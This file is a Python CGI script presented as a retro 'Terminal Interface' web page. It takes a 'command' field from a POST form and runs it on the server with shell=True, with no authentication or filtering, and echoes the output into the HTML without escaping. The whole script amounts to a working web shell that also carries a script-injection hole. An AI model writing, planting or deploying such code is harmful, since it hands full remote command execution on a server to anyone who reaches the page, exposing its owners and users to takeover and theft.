import os
import sys
import subprocess
from urllib.parse import unquote

content_length = int(os.environ.get('CONTENT_LENGTH', 0))
form_data = sys.stdin.read(content_length)

command = ""
for line in form_data.split('&'):
    if line.startswith('command='):
        command = line.split('=', 1)[1]  # Split on the first '=' only
        command = unquote(command)  # Decode URL-encoded characters
        command = command.replace('+', ' ')  # Replace '+' with spaces
        break

try:
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout if result.returncode == 0 else result.stderr
except Exception as e:
    output = f"Error executing command: {str(e)}"

output = output.replace('\n', '<br>')

html_body = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Terminal Interface</title>
    <link href="https://fonts.googleapis.com/css?family=VT323&display=swap" rel="stylesheet">
    <style>
        body {{
            background: #0414a7;
            color: #e0e2f4;
            font: normal 20px/1.25rem 'VT323', monospace;
            margin: 0;
            padding: 0;
        }}

        .terminal {{
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #000000;
            border: 2px solid #e0e2f4;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }}

        .terminal-header {{
            font-size: 1.5rem;
            margin-bottom: 20px;
            text-align: center;
            color: #41ff00;
        }}

        .terminal-body {{
            padding: 10px;
            background: #141414;
            border-radius: 5px;
            height: 300px;
            overflow-y: auto;
            word-wrap: break-word;
            word-break: break-word;
            border: 1px solid #e0e2f4;
        }}

        .input-section {{
            margin-top: 15px;
            display: flex;
            word-wrap: break-word;
            word-break: break-word;
            overflow: hidden;
            flex-shrink: 0;
            overflow-y: auto;
            align-items: center;
        }}

        .input-section label {{
            margin-right: 10px;
            font-size: 1.25rem;
            color: #41ff00;
        }}

        .input-section input[type="text"] {{
            flex-grow: 1;
            font: inherit;
            padding: 8px 10px;
            border: 2px solid #e0e2f4;
            border-radius: 5px;
            background: #000000;
            color: #e0e2f4;
        }}

        .input-section input[type="text"]:focus {{
            outline: none;
            border-color: #41ff00;
        }}

        .input-section button {{
            padding: 8px 15px;
            margin-left: 10px;
            font: inherit;
            background: #41ff00;
            color: #0414a7;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }}

        .input-section button:hover,
        .input-section button:focus {{
            background: #e0e2f4;
            color: #0414a7;
        }}
    </style>
</head>
<body>
    <div class="terminal">
        <div class="terminal-header">Welcome to the Terminal</div>
        <div class="terminal-body" id="output">
            {output}
        </div>
        <form method="POST" action="/cgi-bin/terminal_exec.py">
            <div class="input-section">
                <label for="command-input">$</label>
                <input type="text" id="command-input" name="command" placeholder="Enter your command here..." />
                <button type="submit">Send</button>
            </div>
        </form>
    </div>
</body>
</html>
"""

# Construct the full HTTP response
response = (
    "HTTP/1.1 200 OK\r\n"
    "Content-Type: text/html\r\n"
    f"Content-Length: {len(html_body)}\r\n"
    "\r\n"  # End of headers
    f"{html_body}"
)

# Print the entire response to stdout
print(response)